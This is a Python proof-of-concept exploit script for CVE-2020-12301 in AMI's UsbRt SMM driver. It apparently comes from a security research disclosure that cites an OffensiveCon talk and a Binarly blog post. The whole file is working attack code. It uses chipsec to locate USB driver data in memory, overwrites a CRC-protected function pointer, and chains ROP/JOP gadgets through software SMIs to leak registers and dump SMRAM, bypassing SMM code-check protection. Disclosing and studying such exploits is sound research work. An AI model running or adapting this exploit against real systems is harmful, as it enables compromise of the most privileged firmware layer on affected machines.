#!/usr/bin/env python3

# PoC for CVE-2020-12301 vulnerability that demonstrates SMM_Code_Chk_En bypassing using ROP/JOP technique
# Presentation: https://www.offensivecon.org/speakers/2022/alex-ermolov,-alex-matrosov-and-yegor-vasilenko.html
# Blog: https://binarly.io/posts/AMI_UsbRt_Repeatable_Failures_A_6_year_old_attack_vector_still_affecting_millions_of_enterprise_devices

import struct

import chipsec.chipset
import hexdump
from chipsec.hal.interrupts import Interrupts

from crc32_spoof import get_buffer_crc32, modify_buffer_crc32

PAGE_SIZE = 0x1000
SMI_NUM = 0x31

cs = chipsec.chipset.cs()
cs.init(None, True, True)

intr = Interrupts(cs)
SMRAM = cs.cpu.get_SMRAM()[0]

mem_read = cs.helper.read_physical_mem
mem_write = cs.helper.write_physical_mem
mem_alloc = cs.helper.alloc_physical_mem
io_read = cs.helper.read_io_port


class UsbRtExpl:
    def __init__(self):

        # Print platform information
        print("[+] Platform: {}".format(cs.longname))

        # Structures controlled by the attacker
        self.usb_protocol = None  # EFI_USB_PROTOCOL
        self.usb_data = None  # gUsbData
        self.ustruct = None  # struct_ptr

        self.entry = None
        self.entry_address = None
        self.entry_offset = None

        # Registers
        self.rbx_leak = None
        self.rsp_leak = None
        self.rbp_leak = None
        self.rdi_leak = None
        self.rsi_leak = None
        self.r12_leak = None
        self.r13_leak = None
        self.r14_leak = None
        self.r15_leak = None

        self.prepare()

    @staticmethod
    def read_byte(address):
        return struct.unpack("<B", mem_read(address, 1))[0]

    @staticmethod
    def read_word(address):
        return struct.unpack("<H", mem_read(address, 2))[0]

    @staticmethod
    def read_dword(address):
        return struct.unpack("<I", mem_read(address, 4))[0]

    @staticmethod
    def read_qword(address):
        return struct.unpack("<Q", mem_read(address, 8))[0]

    def prepare(self):
        self.locate_usb_data()  # init self.usb_data

        i = 0  # only the first iteration

        # Get driver entries addresses
        ptr = UsbRtExpl.read_qword(self.usb_data + 0x6C30)
        hc_struc = UsbRtExpl.read_qword(ptr + 8 * i)

        # Check hc_type
        hc_type = UsbRtExpl.read_byte(hc_struc + 1)
        assert hc_type in [16, 32, 48, 64]

        # Check controller
        controller = UsbRtExpl.read_byte(hc_struc + 64)
        if not (controller & 1):
            mem_write(hc_struc + 64, 1, struct.pack("<B", 1))
            assert UsbRtExpl.read_byte(hc_struc + 64) == 1

        print("[+] All checks passed")

        offset = 0xC8 * (((hc_type - 16) >> 4) & 3)
        self.entry_offset = 0x80 + offset
        self.entry_address = self.usb_data + self.entry_offset
        self.entry = UsbRtExpl.read_qword(self.entry_address)
        print("[+] Original call address: {entry:#x}".format(entry=self.entry))

        self.ustruct = self.usb_data + 0x769C
        ustruct_size = 68

        # Check handler
        mem_write(self.ustruct, ustruct_size, b"\x00" * ustruct_size)

        mem_write(self.ustruct, 1, b"\x22")  # write func index
        mem_write(self.ustruct + 2, 1, b"\xff")  # write status

        intr.send_SW_SMI(0, SMI_NUM, 0, 0, 0, 0, 0, 0, 0)

        status = UsbRtExpl.read_byte(self.ustruct + 2)
        assert status == 0x20

    def locate_usb_data(self):
        # Locate EFI_USB_PROTOCOL and usb_data in the memory
        for addr in range(SMRAM // PAGE_SIZE - 1, 0, -1):
            if mem_read(addr * PAGE_SIZE, 4) == b"USBP":
                self.usb_protocol = addr * PAGE_SIZE
                self.usb_data = UsbRtExpl.read_qword(self.usb_protocol + 8)
                break

        if not self.usb_protocol:
            raise "Can not locate gUsbData value"

        if self.usb_data == 0:
            self.usb_data = self.usb_protocol - 0x10000

    def _modify_usb_data_qword(self, offset, data_qword):
        buffer = mem_read(self.usb_data + offset - 8, 0x10)
        crc32 = get_buffer_crc32(buffer)
        buffer = buffer[0:8] + struct.pack("<Q", data_qword)
        buffer = modify_buffer_crc32(buffer, 0, crc32)
        mem_write(self.usb_data + offset - 8, 0x10, buffer)

    def leak_registers(self):
        # Leak addresses
        gadget0_entry = (
            self.entry + 0x11D1D
        )  # 0x000000000001a181: mov ecx, 0xe8; mov rax, rdx; jmp qword ptr [rcx + 0x48];
        gadget1_entry = (
            self.entry + 0x11C2B
        )  # save state func content to leak RSP value

        rcx = 0xE8
        mem_write(rcx + 0x48, 8, struct.pack("<Q", gadget1_entry))

        self._modify_usb_data_qword(self.entry_offset, gadget0_entry)

        print(
            "[+] New call address: {:#x}".format(
                UsbRtExpl.read_qword(self.entry_address)
            )
        )

        mem_write(self.ustruct, 1, b"\x21")  # write func index (func 2)
        mem_write(self.ustruct + 2, 1, b"\xff")  # write status

        intr.send_SW_SMI(0, SMI_NUM, 0, 0, 0, 0, 0, 0, 0)
        status = UsbRtExpl.read_byte(self.ustruct + 2)
        assert status == 0

        # Restore usb_data
        self._modify_usb_data_qword(self.entry_offset, self.entry)

        # Get registers
        self.rbx_leak = UsbRtExpl.read_qword(rcx)
        self.rsp_leak = UsbRtExpl.read_qword(rcx + 0x8)
        self.rbp_leak = UsbRtExpl.read_qword(rcx + 0x10)
        self.rdi_leak = UsbRtExpl.read_qword(rcx + 0x18)
        self.rsi_leak = UsbRtExpl.read_qword(rcx + 0x20)
        self.r12_leak = UsbRtExpl.read_qword(rcx + 0x28)
        self.r13_leak = UsbRtExpl.read_qword(rcx + 0x30)
        self.r14_leak = UsbRtExpl.read_qword(rcx + 0x38)
        self.r15_leak = UsbRtExpl.read_qword(rcx + 0x40)

        # Print registers
        print("[+] RBX value: {:#x}".format(self.rbx_leak))
        print("[+] RSP value: {:#x}".format(self.rsp_leak))
        print("[+] RBP value: {:#x}".format(self.rbp_leak))
        print("[+] RDI value: {:#x}".format(self.rdi_leak))
        print("[+] RSI value: {:#x}".format(self.rsi_leak))
        print("[+] R12 value: {:#x}".format(self.r12_leak))
        print("[+] R13 value: {:#x}".format(self.r13_leak))
        print("[+] R14 value: {:#x}".format(self.r14_leak))
        print("[+] R15 value: {:#x}".format(self.r15_leak))
        print("[+] RDX value: {:#x}".format(UsbRtExpl.read_qword(rcx + 0x48)))
        print("[+] RCX value: {:#x}".format(rcx))

    def get_smram_byte(self, index, rcx):
        rax = 0x258  # from RE
        rdi = self.rdi_leak  # 0x40, leaked before

        gadget0_address = (
            self.entry + 0x539F
        )  # 0x0000000000007d803: movzx r8d, bp; mov rdx, rsi; mov rcx, rbx; call qword ptr [rax];
        gadget1_address = (
            self.entry - 0x51F
        )  # 0x0000000000007f45: mov rdx, [rdi + 0x18]; mov rcx, qword ptr [rdi + 0x10]; call qword ptr [rax + 8];
        gadget2_address = self.entry + 0x11CAC  # InternalLongJump function
        gadget3_address = self.entry + 0x11D4C  # CopyMem

        # Prepare RAX
        mem_write(rax, 8, struct.pack("<Q", gadget1_address))
        mem_write(rax + 8, 8, struct.pack("<Q", gadget2_address))

        # Prepare RDI
        mem_write(rdi + 0x10, 8, struct.pack("<Q", rcx))
        mem_write(rdi + 0x18, 8, struct.pack("<Q", SMRAM + index))

        # Prepare RCX
        mem_write(rcx, 8, struct.pack("<Q", self.rbx_leak))
        mem_write(rcx + 0x8, 8, struct.pack("<Q", self.rsp_leak - 8))
        mem_write(rcx + 0x10, 8, struct.pack("<Q", self.rbp_leak))
        mem_write(rcx + 0x18, 8, struct.pack("<Q", self.rdi_leak))
        mem_write(rcx + 0x20, 8, struct.pack("<Q", self.rsi_leak))
        mem_write(rcx + 0x28, 8, struct.pack("<Q", self.r12_leak))
        mem_write(rcx + 0x30, 8, struct.pack("<Q", self.r13_leak))
        mem_write(rcx + 0x38, 8, struct.pack("<Q", self.r14_leak))
        mem_write(rcx + 0x40, 8, struct.pack("<Q", self.r15_leak))
        mem_write(rcx + 0x48, 8, struct.pack("<Q", gadget3_address))

        self._modify_usb_data_qword(self.entry_offset, gadget0_address)

        mem_write(self.ustruct, 1, b"\x21")  # write func index (func 2)
        mem_write(self.ustruct + 2, 1, b"\xff")  # write status

        intr.send_SW_SMI(0, SMI_NUM, 0, 0, 0, 0, 0, 0, 0)
        status = UsbRtExpl.read_byte(self.ustruct + 2)
        assert status == 0

        # Restore usb_data
        self._modify_usb_data_qword(self.entry_offset, self.entry)

        return UsbRtExpl.read_byte(rcx)


def main():
    expl = UsbRtExpl()

    # Leak registers
    print("[+] Leaking register values...")
    expl.leak_registers()

    # Dump SMRAM
    print("[+] Dumping SMRAM...")
    rcx = mem_alloc(0x1000, 0xFFFFFFFF)[1]
    size = 256
    smram_dump = bytes(
        bytearray([expl.get_smram_byte(index, rcx) for index in range(size)])
    )
    hexdump.hexdump(smram_dump)


if __name__ == "__main__":
    main()
